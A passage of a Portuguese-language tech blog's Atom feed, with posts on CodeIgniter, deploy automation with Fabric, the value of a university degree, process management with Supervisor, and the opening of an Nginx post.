que permita para você um trabalho descomplicado com o &lt;em&gt;MVC&lt;/em&gt;, recomendo
&lt;em&gt;CodeIgniter&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É claro que ele tem algumas desvantagens se comparado a outros
&lt;em&gt;frameworks&lt;/em&gt; do mercado. Por exemplo, acredito que o desenvolvimento com
o &lt;em&gt;CakePHP&lt;/em&gt; seja mais ágil e fácil se comparado ao &lt;em&gt;CI&lt;/em&gt; (é claro,
isso tem um custo na performance e tamanho). Mas com a versão &lt;strong&gt;2.x&lt;/strong&gt;, é
visível que a ferramenta está caminhando para um desenvolvimento de alto
nível.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="php"></category><category term="codeigniter"></category></entry><entry><title>Automatize o deploy dos seus projetos com Fabric</title><link href="https://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric.html" rel="alternate"></link><published>2012-02-26T19:40:13-03:00</published><updated>2012-02-26T19:40:13-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-02-26:/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric.html</id><summary type="html">&lt;p&gt;Durante a minha árdua trajetória com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;,
sempre fiz “subidas” de projetos utilizando um cliente &lt;a href="http://pt.wikipedia.org/wiki/File_Transfer_Protocol" title="Leia mais sobre File Transfer Protocol"&gt;&lt;em&gt;FTP&lt;/em&gt;&lt;/a&gt;. Um
processo manual, extremamente repetitivo (e chato).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Já com &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, pude utilizar o &lt;a href="http://pt.wikipedia.org/wiki/SSH" title="Leia mais sobre Secure Shell"&gt;&lt;em&gt;SSH&lt;/em&gt;&lt;/a&gt;, que me proporcionou
maior agilidade e liberdade dentro do ambiente de produção. Mas que não
deixou de ser um …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Durante a minha árdua trajetória com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;,
sempre fiz “subidas” de projetos utilizando um cliente &lt;a href="http://pt.wikipedia.org/wiki/File_Transfer_Protocol" title="Leia mais sobre File Transfer Protocol"&gt;&lt;em&gt;FTP&lt;/em&gt;&lt;/a&gt;. Um
processo manual, extremamente repetitivo (e chato).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Já com &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, pude utilizar o &lt;a href="http://pt.wikipedia.org/wiki/SSH" title="Leia mais sobre Secure Shell"&gt;&lt;em&gt;SSH&lt;/em&gt;&lt;/a&gt;, que me proporcionou
maior agilidade e liberdade dentro do ambiente de produção. Mas que não
deixou de ser um processo manual, extremamente repetitivo, chato e muito
suscetível a falhas.&lt;/p&gt;
&lt;p&gt;Foi utilizando o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; que conheci o &lt;a href="http://docs.fabfile.org/en/1.4.0/index.html" title="A library and command-line tool for streamlining the use of SSH for application deployment or systems administration tasks"&gt;&lt;em&gt;Fabric&lt;/em&gt;&lt;/a&gt;, e percebi
quanto tempo podemos economizar automatizando o processo de &lt;em&gt;deploy&lt;/em&gt; de
nossos projetos.&lt;/p&gt;
&lt;h2&gt;O agile e o deploy contínuo&lt;/h2&gt;
&lt;p&gt;Todo e qualquer procedimento de &lt;em&gt;upload&lt;/em&gt; do seu projeto para o ambiente
de produção corre algum tipo de risco. Com o &lt;em&gt;deploy&lt;/em&gt; automatizado,
a tendência é que este risco seja reduzido, e que você possa fazer a
entrega do seu projeto para &lt;a href="https://klauslaube.com.br/2011/03/07/diferentes-ambientes.html" title="Diferentes ambientes: Development, Testing, Staging e Production"&gt;diversos ambientes&lt;/a&gt; com o menor esforço
possível.&lt;/p&gt;
&lt;p&gt;Logo, não consigo imaginar um cenário eficiente de &lt;em&gt;deploy&lt;/em&gt;
contínuo, sem a utilização de alguma ferramenta de automatização. É
através destas que respeitamos uma das premissas do &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre Agile"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;, e
diminuímos a incidência de falha humana.&lt;/p&gt;
&lt;h2&gt;Mas o que é o Fabric?&lt;/h2&gt;
&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Fabric&lt;/em&gt;&lt;/strong&gt; é uma &lt;em&gt;lib&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt;, e ferramenta de linha de comando,
para auxiliá-lo em seu &lt;em&gt;deploy&lt;/em&gt; e na administração remota dos seus
sistemas.&lt;/p&gt;
&lt;p&gt;Embora seja feita em &lt;em&gt;Python&lt;/em&gt;, pode ser utilizada em projetos escritos
em qualquer linguagem. Equivale ao &lt;a href="http://en.wikipedia.org/wiki/Capistrano" title="Leia mais sobre o Capistrano"&gt;&lt;em&gt;Capistrano&lt;/em&gt;&lt;/a&gt;, alternativa mais
famosa, escrita em &lt;em&gt;Ruby&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Em casa de ferreiro, espeto de ferro&lt;/h2&gt;
&lt;p&gt;Para dar um exemplo de uso do &lt;em&gt;Fabric&lt;/em&gt;, podemos utilizar o esquema de
&lt;em&gt;deploy&lt;/em&gt; deste &lt;em&gt;blog&lt;/em&gt;. Sim! O processo está automatizado, e você pode
&lt;a href="https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py" title="Confira o script Fabric no repositório do BitBucket"&gt;conferí-lo no &lt;em&gt;BitBucket&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Antes de mais nada, é necessário ter o &lt;em&gt;Fabric&lt;/em&gt; instalado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install fabric
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todo o procedimento será escrito em um arquivo chamado &lt;strong&gt;fabfile.py&lt;/strong&gt;.
Com o comando &lt;strong&gt;fab&lt;/strong&gt;, a ferramenta carregará este arquivo e permitirá a
execução de todos os métodos públicos definidos dentro dele.&lt;/p&gt;
&lt;p&gt;Vamos listar todos os métodos que &lt;a href="https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py" title="Veja no BitBucket"&gt;criei no &lt;strong&gt;fabfile.py&lt;/strong&gt; do &lt;em&gt;blog&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ fab -l

Available commands:

bootstrap            Initialize remote host environment.
collect_static       Collect all static files from Django apps and copy ...
create_virtualenv    Setup virtualenv on remote host.
database_restart     Restart the database server on remote server.
deploy               Send the code to the remote host.
http_restart         Restart the HTTP server on remote server.
migrate              Execute South on remote host, to update the databas...
production           Use production environment on remote host.
staging              Use staging environment on remote host.
syncdb               Execute syncdb on remote host.
update_apache_conf   Move apache and fastcgi files to the public html.
update_requirements  Update Python dependencies on remote host.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como é possível notar na listagem acima, temos operações de &lt;em&gt;deploy&lt;/em&gt;
(&lt;strong&gt;deploy&lt;/strong&gt;, &lt;strong&gt;syncdb&lt;/strong&gt;, &lt;strong&gt;update_requirements&lt;/strong&gt; e
&lt;strong&gt;update_apache_conf&lt;/strong&gt;) e operações de administração remota
(&lt;strong&gt;database_restart&lt;/strong&gt;, &lt;strong&gt;http_restart&lt;/strong&gt;, &lt;strong&gt;migrate&lt;/strong&gt;, etc). Os métodos
&lt;strong&gt;production&lt;/strong&gt; e &lt;strong&gt;staging&lt;/strong&gt; são basicamente para “setar” para qual
ambiente o &lt;em&gt;deploy&lt;/em&gt; será realizado. Por exemplo, a cada nova subida de
&lt;em&gt;release&lt;/em&gt;, executo o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ fab production deploy http_restart
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde basicamente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Defino o usuário, &lt;em&gt;IP&lt;/em&gt;, e &lt;em&gt;paths&lt;/em&gt; para o ambiente de produção através do método &lt;strong&gt;production&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Executo o envio dos arquivos através de &lt;a href="http://pt.wikipedia.org/wiki/Rsync" title="Leia mais sobre Rsync"&gt;&lt;strong&gt;Rsync&lt;/strong&gt;&lt;/a&gt; para o servidor, com o método &lt;strong&gt;deploy&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Reinicio o &lt;em&gt;Apache&lt;/em&gt; através do método &lt;strong&gt;http_restart&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Se olharmos atentamente o &lt;a href="https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py#cl-101" title="Veja em detalhes o método deploy"&gt;método &lt;strong&gt;deploy&lt;/strong&gt;&lt;/a&gt;, utilizamos uma &lt;em&gt;lib&lt;/em&gt;
(importada no início do arquivo) chamada &lt;strong&gt;rsync_project&lt;/strong&gt;. Que
corresponde a ferramenta de linha de comando (encontrada em sistemas
baseados em &lt;em&gt;Unix&lt;/em&gt;) chamada &lt;strong&gt;rsync&lt;/strong&gt;. O que o &lt;em&gt;Fabric&lt;/em&gt; faz (com
maestria) é “abstrair” essas operações para que possamos fazer os nossos
procedimentos através de uma interface simples (outros comandos, como
&lt;strong&gt;scp&lt;/strong&gt; e &lt;strong&gt;sudo&lt;/strong&gt; também são utilizados pelo &lt;em&gt;Fabric&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A função &lt;a href="https://bitbucket.org/kplaube/klauslaube.com.br/src/d579e9d81641/fabfile.py#cl-199" title="Veja um exemplo de uso no fabfile.py"&gt;&lt;strong&gt;run&lt;/strong&gt;&lt;/a&gt; faz grande parte da magia acontecer. Com ela,
abrimos uma conexão &lt;em&gt;SSH&lt;/em&gt; com o nosso servidor, e executamos comandos
como se estívessemos em um terminal. Extremamente útil para fazer
&lt;em&gt;restart&lt;/em&gt; de serviços, escalonamento de &lt;em&gt;logs&lt;/em&gt;, limpeza de temporários,
etc.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Fabric&lt;/em&gt; é muito simples de usar. Lendo o básico da documentação, já
somos capazes de automatizar os processos mais triviais.&lt;/p&gt;
&lt;p&gt;Recomendo o &lt;a href="https://bitbucket.org/copelco/caktus-deployment/src/6ad8ad84a938/example-django-project/caktus_website/fabfile.py" title="Veja-o no BitBucket"&gt;&lt;strong&gt;fabfile.py&lt;/strong&gt;&lt;/a&gt; da &lt;a href="http://www.caktusgroup.com/" title="Visite o site da Caktus"&gt;&lt;em&gt;Caktus Consulting Group&lt;/em&gt;&lt;/a&gt;. Simples
e bem escrito, foi nele que me baseei para escrever o &lt;em&gt;script&lt;/em&gt;
apresentado neste &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.fabfile.org/en/1.4.0/index.html" title="Fabric: a library and command-line tool for streamlining the use of SSH for application deployment or systems administration tasks"&gt;&lt;em&gt;Fabric – Documentation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://yuji.wordpress.com/2011/04/09/django-python-fabric-deployment-script-and-example/" title="Excelente exemplo de uso do Fabric"&gt;&lt;em&gt;Useful Stuff – Fabric Deployment Script and Example&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="fabric"></category><category term="deploy"></category></entry><entry><title>Graduação não é só diploma</title><link href="https://klauslaube.com.br/2012/02/14/graduacao-nao-e-so-diploma.html" rel="alternate"></link><published>2012-02-14T23:21:39-02:00</published><updated>2012-02-14T23:21:39-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-02-14:/2012/02/14/graduacao-nao-e-so-diploma.html</id><summary type="html">&lt;p&gt;Se eu fizer o exercício proposto por &lt;em&gt;Steve Jobs&lt;/em&gt;, de &lt;strong&gt;“ligar os
pontos”&lt;/strong&gt;, sou capaz de dizer que as melhores experiências profissionais
da minha vida estão de alguma forma relacionadas com o &lt;strong&gt;ambiente
acadêmico&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Graças ao &lt;strong&gt;curso técnico&lt;/strong&gt;, tive a oportunidade de trabalhar com
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; desde o início da minha …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Se eu fizer o exercício proposto por &lt;em&gt;Steve Jobs&lt;/em&gt;, de &lt;strong&gt;“ligar os
pontos”&lt;/strong&gt;, sou capaz de dizer que as melhores experiências profissionais
da minha vida estão de alguma forma relacionadas com o &lt;strong&gt;ambiente
acadêmico&lt;/strong&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Graças ao &lt;strong&gt;curso técnico&lt;/strong&gt;, tive a oportunidade de trabalhar com
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; desde o início da minha carreira. Já na &lt;strong&gt;graduação&lt;/strong&gt;, pude
conviver com pessoas muito mais inteligentes e interessantes que eu.
Pessoas com um conhecimento e &lt;em&gt;feeling&lt;/em&gt; sobre o mercado de Tecnologia da
Informação, que fizeram toda a diferença na minha vida.&lt;/p&gt;
&lt;p&gt;Também tive o prazer de trabalhar em duas empresas incubadas pelo
&lt;a href="http://www.catolicasc.org.br/" title="UNERJ, atual Católica de Santa Catarina"&gt;&lt;em&gt;Centro Universitário de Jaraguá do Sul (UNERJ)&lt;/em&gt;&lt;/a&gt;. Nelas, tive a liberdade e
oportunidade de explorar &lt;strong&gt;conceitos técnicos e de gestão&lt;/strong&gt;, que não
poderia exercer em hipótese alguma em outras empresas de porte maior.&lt;/p&gt;
&lt;p&gt;São essas experiências, aliadas a um conjunto de valores, que me
permitem escrever para você hoje como &lt;strong&gt;analista e desenvolvedor web&lt;/strong&gt;
da &lt;a href="http://globo.com" title="Absolutamente tudo sobre notícias e entretenimento"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;. Uma empresa que acredita muito mais no que você pode
mostrar, e não no que instituições de ensino têm a dizer a seu respeito.&lt;/p&gt;
&lt;p&gt;E vejo esta tendência, de profissionais e instituições contestarem o
valor da graduação, ganhar cada vez mais força. É fato que o diploma não
garante que você será um bom profissional, somente a prática e
experiência poderão certificar isso. Se olharmos para a história,
veremos que pessoas como o próprio &lt;a href="http://pt.wikipedia.org/wiki/Steve_Jobs" title="Leia mais sobre Steve Jobs na Wikipedia"&gt;&lt;em&gt;Steve Jobs&lt;/em&gt;&lt;/a&gt;, &lt;a href="http://pt.wikipedia.org/wiki/Bill_Gates" title="Leia mais sobre Bill Gates na Wikipedia"&gt;&lt;em&gt;Bill Gates&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://akitaonrails.com/" title="Conheça o Fábio Akita"&gt;&lt;em&gt;Fábio Akita&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://marcogomes.com/blog/" title="Conheça um dos jovens empreendedores de maior sucesso no país"&gt;&lt;em&gt;Marco Gomes&lt;/em&gt;&lt;/a&gt;, nem sequer terminaram a
graduação, e são hoje mais do que certificados, são empreendedores de
sucesso e referências em suas áreas de atuação.&lt;/p&gt;
&lt;p&gt;O ambiente acadêmico é &lt;strong&gt;sim&lt;/strong&gt; muito rico e relevante, e como
profissional formado estou certo que ele foi um dos responsáveis por me
fazer chegar até aqui. Foi através da graduação que aprendi valores como
“determinação” e “autodidatismo”, e aprendi a valorizar o &lt;em&gt;networking&lt;/em&gt; e
a troca de conhecimento. É certo que não desenvolveria estas qualidades
fora deste ambiente, e num exercício de analisar o passado, sou capaz de
concluir que as experiências (ou a trajetória) foram muito mais
significativas do que o ato de receber o diploma em si.&lt;/p&gt;
&lt;p&gt;Acredito que o problema de hoje é que o “canudo”, aquele &lt;strong&gt;“pedaço de
papel”&lt;/strong&gt; que garante que você está apto para o mercado de trabalho,
virou nosso principal objetivo quando ingressamos em uma graduação.
Deixamos que todo o caminho a ser trilhado e conhecimento a ser
adquirido, seja encarado como um sacrifício, e não como uma oportunidade
de crescimento.&lt;/p&gt;
&lt;p&gt;Culpa das instituições de ensino, ou dos alunos? Não tenho a resposta
para este questionamento. Mas, no fim das contas, a mensagem que quero
passar para você é a seguinte: &lt;strong&gt;Aproveite ao máximo o ambiente
acadêmico&lt;/strong&gt;. Dificilmente em outras épocas da sua vida você terá tanto
tempo e disposição para adquirir conhecimento. “Esprema” o máximo que
puder dos seus professores e colegas, participe de projetos científicos,
de atividades extracurriculares, empenhe-se em trabalhos e provas.
Afinal, como diria o &lt;em&gt;Scorpions&lt;/em&gt;, “no pain, no gain”.&lt;/p&gt;
&lt;p&gt;E acima de tudo, faça o que você ama, e use a graduação para descobrir
se é isto mesmo que você quer fazer na sua vida.&lt;/p&gt;
&lt;p&gt;Esse artigo foi originalmente escrito para o jornal &lt;a href="http://www.folhasc.com/" title="O jornal de vanguarda"&gt;&lt;em&gt;FolhaSC&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;</content><category term="profissao"></category><category term="carreira"></category><category term="graduacao"></category></entry><entry><title>Supervisor: Aumentando a disponibilidade das suas aplicações Web</title><link href="https://klauslaube.com.br/2012/01/23/supervisor-gerencie-os-processos-seu-servidor-web.html" rel="alternate"></link><published>2012-01-23T21:28:00-02:00</published><updated>2012-01-23T21:28:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-01-23:/2012/01/23/supervisor-gerencie-os-processos-seu-servidor-web.html</id><summary type="html">&lt;p&gt;E se você pudesse controlar uma série de processos
através de um comando? Ou de garantir que serviços “down” sejam
reiniciados automaticamente? Ou ainda, agrupar seus serviços e poder
reiniciá-los com um simples comando de terminal?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Supervisor&lt;/em&gt;&lt;/strong&gt; aparece para facilitar muito a vida de quem precisa
administrar servidores &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web …&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;E se você pudesse controlar uma série de processos
através de um comando? Ou de garantir que serviços “down” sejam
reiniciados automaticamente? Ou ainda, agrupar seus serviços e poder
reiniciá-los com um simples comando de terminal?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Supervisor&lt;/em&gt;&lt;/strong&gt; aparece para facilitar muito a vida de quem precisa
administrar servidores &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, e não tem muito tempo a perder com
criação de rotinas, ou mesmo com trabalho manual.&lt;/p&gt;
&lt;h2&gt;Afinal, o que é o Supervisor?&lt;/h2&gt;
&lt;p&gt;A proposta do &lt;a href="http://supervisord.org/" title="Conheça o projeto Supervisor"&gt;&lt;em&gt;Supervisor&lt;/em&gt;&lt;/a&gt; é simples: permitir que usuários possam
controlar e monitorar processos (e grupos de processos) em um sistema
&lt;em&gt;Unix-like&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Em suma, o &lt;em&gt;Supervisor&lt;/em&gt; é um programa escrito em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, capaz de
iniciar, reiniciar e parar outros programas. Mas, o que me chamou mais a
atenção, é que ele é capaz de reiniciar programas “crashados”
automaticamente.&lt;/p&gt;
&lt;p&gt;Isso é possível pois, por baixo dos panos, o &lt;em&gt;Supervisor&lt;/em&gt; é um serviço
que inicia todos os demais como subprocessos. Desse modo, é capaz de
monitorar o estado dos mesmos, e numa eventual “queda”, reiniciar um
determinado processo/serviço imediatamente.&lt;/p&gt;
&lt;p&gt;Ou seja, funciona como uma ferramenta centralizadora e de monitoramento.
E que ainda serve uma &lt;em&gt;API&lt;/em&gt; para gerenciamento remoto, &lt;a href="http://supervisord.org/api.html" title="Leia mais sobre a API do Supervisor"&gt;através de &lt;em&gt;XML-RPC&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Instalar para administrar&lt;/h2&gt;
&lt;p&gt;Para instalar, basta utilizar o &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install supervisor
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos gerar um arquivo de configuração básico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ echo_supervisord_conf &amp;gt; /etc/supervisord.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos aproveitar que &lt;a href="https://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil.html" title="Nginx: Poderoso, rápido e fácil"&gt;falamos recentemente sobre a instalação do &lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt;,
para demonstrar o princípio do &lt;em&gt;Supervisor&lt;/em&gt;. Adicione as
seguintes linhas ao arquivo &lt;code&gt;/etc/supervisord.conf&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[program:nginx]&lt;/span&gt;
&lt;span class="s"&gt;command=/usr/local/nginx/sbin/nginx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora iniciamos o serviço do &lt;em&gt;Supervisor&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ supervisord
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E através do &lt;code&gt;supervisorctl&lt;/code&gt;, vamos iniciar e parar o &lt;em&gt;Nginx&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ supervisorctl start all
nginx: started

$ ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root      &lt;span class="m"&gt;1863&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.1 &lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt; /usr/local/nginx/sbin/nginx

$ supervisorctl stop nginx
nginx: stopped
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E agora, o “pulo do gato”. Com o &lt;em&gt;Nginx&lt;/em&gt; iniciado via &lt;em&gt;Supervisor&lt;/em&gt;,
vamos fechá-lo através de um comando &lt;code&gt;kill&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ supervisorctl start nginx
nginx: started

$ killall nginx

$ ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root      &lt;span class="m"&gt;1917&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.1 &lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt; /usr/local/nginx/sbin/nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Magia? Que nada! É a ferramenta garantindo que os nossos processos não
fiquem “down”. &lt;a href="http://brandonkonkle.com/blog/2010/sep/14/django-uwsgi-and-nginx/" title="Django on uWSGI and Nginx"&gt;&lt;em&gt;Brandon Konkle&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://senko.net/en/django-nginx-gunicorn/" title="A Django setup using Nginx and Gunicorn"&gt;&lt;em&gt;Senko Rasic&lt;/em&gt;&lt;/a&gt; possuem exemplos
utilizando um cenário real com &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/nginx.html" title="Leia mais sobre Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Embora o &lt;em&gt;Supervisor&lt;/em&gt; seja uma ferramenta espetacular, acredito que
muitos profissionais já possuam intimidade com os seus servidores, bem
como já tenham construído &lt;em&gt;sets&lt;/em&gt; de &lt;em&gt;scripts&lt;/em&gt;, e atalhos em geral. Isso,
de fato, faz a gente questionar a utilidade dela.&lt;/p&gt;
&lt;p&gt;A possibilidade de monitorar e garantir a disponibilidade dos processos
foi o que mais me agradou. Se você tem “poderes administrativos” na sua
hospedagem, talvez o &lt;em&gt;Supervisor&lt;/em&gt; seja a ferramenta que faltava para
você possa dormir mais tranquilo.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://supervisord.org/" title="Supervisor - A process control system"&gt;&lt;em&gt;Supervisor&lt;/em&gt; – Documentação oficial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://brandonkonkle.com/blog/2010/sep/14/django-uwsgi-and-nginx/" title="Saiba como montar um servidor Nginx com Django, uWSGI e Supervisor"&gt;&lt;em&gt;Brandon Konkle – Django on uWSGI and Nginx&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.plope.com/static/misc/supervisor-pycon2008.pdf" title="Apresentação para a PyCon 2008, sobre Supervisor"&gt;&lt;em&gt;Mike Naberezny – Supervisor as a Platform&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://senko.net/en/django-nginx-gunicorn/" title="Um ótimo exemplo de uso do Nginx, Django e Supervisor"&gt;&lt;em&gt;Senko’s Blog – A Django setup using Nginx and Gunicorn&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="infraestrutura"></category><category term="ambiente-de-desenvolvimento"></category><category term="web"></category><category term="supervisor"></category><category term="linux"></category></entry><entry><title>Nginx: Poderoso, rápido e fácil</title><link href="https://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil.html" rel="alternate"></link><published>2011-12-19T20:41:00-02:00</published><updated>2011-12-19T20:41:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-12-19:/2011/12/19/nginx-poderoso-rapido-facil.html</id><summary type="html">&lt;p&gt;Para quem (assim como eu) começou com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, uma das opções mais viáveis
para servir projetos na &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; sempre foi o &lt;a href="http://httpd.apache.org/" title="Página oficial do projeto Apache"&gt;&lt;em&gt;Apache&lt;/em&gt;&lt;/a&gt;. &lt;em&gt;Open source&lt;/em&gt;,
prático e disponível em quase toda hospedagem de respeito (afinal, ele vem por
padrão em quase toda distro &lt;a href="https://klauslaube.com.br/tag/linux.html" title="Leia mais sobre Linux"&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;), há anos que ele faz a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Para quem (assim como eu) começou com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, uma das opções mais viáveis
para servir projetos na &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; sempre foi o &lt;a href="http://httpd.apache.org/" title="Página oficial do projeto Apache"&gt;&lt;em&gt;Apache&lt;/em&gt;&lt;/a&gt;. &lt;em&gt;Open source&lt;/em&gt;,
prático e disponível em quase toda hospedagem de respeito (afinal, ele vem por
padrão em quase toda distro &lt;a href="https://klauslaube.com.br/tag/linux.html" title="Leia mais sobre Linux"&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;), há anos que ele faz a famosa
